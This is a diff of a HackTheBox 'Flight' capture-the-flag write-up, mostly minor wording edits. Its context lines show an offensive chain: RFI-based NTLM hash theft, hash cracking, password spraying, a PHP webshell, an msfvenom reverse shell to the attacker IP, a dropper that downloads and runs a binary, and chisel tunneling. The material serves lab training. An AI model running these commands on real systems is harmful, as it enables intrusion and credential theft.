@@ -5,7 +5,7 @@ categories: [HTB Machines]
 tags: [Hard, Windows, HTB]
 ---
 
-**Flight** is a hard HTB machine that involves exploiting **improper input sanitization** in a URL parameter to obtain credentials. Subsequently, there's extensive **lateral movement** by poisoning and abusing SMB shares, aligning pretty well with the thematic of the box. Finally, privilege escalation to SYSTEM is achievable through exploiting **weak permissions** in an internal web service.
+**Flight** is a hard HTB machine that involves exploiting **improper input sanitization** in a URL parameter to obtain credentials. Subsequently, there's extensive **lateral movement** by poisoning and abusing SMB shares, aligning pretty well with the thematic of the box. Finally, privilege escalation to SYSTEM is achievable through exploiting **write permissions** of a compromised user in an **internal web service** that is running as a high-privileged machine account.
 
 <img src="/assets/img/flight/Untitled.png" alt="Untitled 1.png" style="width:600px;">
 
@@ -136,7 +136,7 @@ http://school.flight.htb/?view=//10.10.14.112/share/file
 
 <img src="/assets/img/flight/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">
 
-We successfully stole and cracked the svc_apache user hash.
+We successfully stole and cracked the Svc_apache's hash.
 
 ```
 hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
@@ -164,7 +164,7 @@ SMB         10.129.228.120  445    G0               Web             READ
 
 # Lateral Movement 1
 
-Now that we are credentialed in the Domain Controller, it is an easy task to gather info such as domain users and groups. Running [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) is an option but I rather do it manually
+Now that we are credentialed in the Domain Controller, it is an easy task to gather info such as domain users and groups. Running [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) is an option but I rather do it manually.
 
 ```bash
 netexec smb 10.129.228.120 -u "svc_apache" -p '<REDACTED>' --users 
@@ -201,7 +201,7 @@ svc_apache
 O.Possum
 ```
 
-Being methodical with a **password spray** paid off, getting a hit for a user called S.Moon.
+Being methodical with a **password spray** paid off, getting a hit for a user called 'S.Moon'.
 
 ```bash
 netexec smb 10.129.228.120 -u users.list -p '<REDACTED>' --continue-on-success | grep -v '[-]' 
@@ -251,14 +251,14 @@ benign
 ...
 ```
 
-Uploaded a desktop.ini, which extension wasn’t blacklisted.
+Uploaded a desktop.ini, which extension wasn’t blacklisted as others.
 
 ```bash
 smbclient -U 'flight.htb\S.Moon%<REDACTED>' //10.129.228.120/Shared -c "put desktop.ini"
 putting file desktop.ini as \desktop.ini (0.3 kb/s) (average 0.3 kb/s)
 ```
 
-Responder grabbed a hash from c.bum XD. Let’s see if his password is as good as his lat spread.
+Responder grabbed a hash from C.Bum XD. Let’s see if his password is as good as his lat spread.
 
 <img src="/assets/img/flight/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">
 
@@ -271,7 +271,7 @@ C.BUM::flight.htb:41960e710475...:<REDACTED>
 
 <img src="/assets/img/flight/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">
 
-This time we have juicy write permissions on the Web share.
+This time we have juicy write permissions on the Web's share.
 
 ```bash
 netexec smb 10.129.228.120 -u "c.bum" -p '<REDACTED>' --shares
@@ -292,7 +292,7 @@ SMB         10.129.228.120  445    G0               Web             READ,WRITE
 
 # Lateral Movement 3
 
-**Quick reminder**: We got a foothold by exploiting a RFI vulnerable parameter in the school subdomain. This is an clear indicator that we should focus on the flight.htb share subdirectory.
+**Quick reminder**: We got a foothold by exploiting a RFI vulnerable parameter in the school subdomain. This is an clear indicator that we should focus on the 'flight.htb' share subdirectory.
 
 We have full access to the web server. Luckily, the web service might be running as a high privileged user. Let’s check what file extension should we upload.
 
@@ -308,7 +308,7 @@ smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "ls flight.ht
   js                                  D        0  Wed May  8 04:57:00 2024
 ```
 
-Wappalyzer tells us that it is Apache + PHP, which is weird for a Windows server. Commonly, we will have to upload an ASPX webshell but this time is an exception.
+Wappalyzer tells us that it is Apache + PHP, which is weird for a Windows server. Commonly, we will have to upload an ASPX webshell but there are exceptions too.
 
 <img src="/assets/img/flight/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">
 
@@ -335,7 +335,7 @@ smbclient -U 'flight.htb\c.bum%<REDACTED>' //10.129.228.120/Web -c "ls flight.ht
   webshell.php                        A      101  Wed May  8 05:07:59 2024
 ```
 
-Unfortunately, this web service is running as svc_apache. At least we managed to get RCE.
+Unfortunately, this web service is running as 'svc_apache'. At least we managed to get RCE.
 
 ```
 http://flight.htb/webshell.php?fc8358bcf09e4b3947d1975622a9df14=whoami
@@ -351,7 +351,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.112 LPORT=443 -f ex
 msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 443; run"
 ```
 
-Next step is to upload the following file over SMB and execute it via URL.
+Next step is to upload the following file over SMB and execute it via URL. It will download the the binary that we created and execute it, which is why I called it 'primer.php' (reference to DNA replication XD).
 
 ```bash
 cat primer.php  
@@ -429,7 +429,7 @@ PS C:\Users\Public> .\chisel.exe client 10.10.14.112:1234 R:8000:127.0.0.1:8000
 2024/05/07 21:57:45 client: Connected (Latency 63.6654ms)
 ```
 
-Now we can access to this cool page from our VM.
+Now it is possible to access to this cool page from our VM.
 
 <img src="/assets/img/flight/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">
 
@@ -469,7 +469,7 @@ c:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 ```
 
-However, C.Bum does not have PS Remote permissions and we don’t have a GUI but what we have are his credentials. Uploaded [RunasCs](https://github.com/antonioCoco/RunasCs) and [Laudanum’s ASPX webshell](https://github.com/jbarcia/Web-Shells/blob/master/laudanum/aspx/shell.aspx).
+However, C.Bum does not have PS Remote access and we don’t have a GUI but what we have are his credentials. Uploaded [RunasCs](https://github.com/antonioCoco/RunasCs) and [Laudanum’s ASPX webshell](https://github.com/jbarcia/Web-Shells/blob/master/laudanum/aspx/shell.aspx).
 
 ```
 PS C:\inetpub> iwr -uri http://10.10.14.112/shell.aspx -outfile c:\users\public\shell.aspx
@@ -494,7 +494,7 @@ PS C:\inetpub> dir c:\inetpub\development
 	-a----         5/7/2024  11:22 PM           4334 shell.aspx
 ```
 
-We achieved remote command execution as a machine account.
+We achieved remote command execution as a machine account!
 
 <img src="/assets/img/flight/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">
 
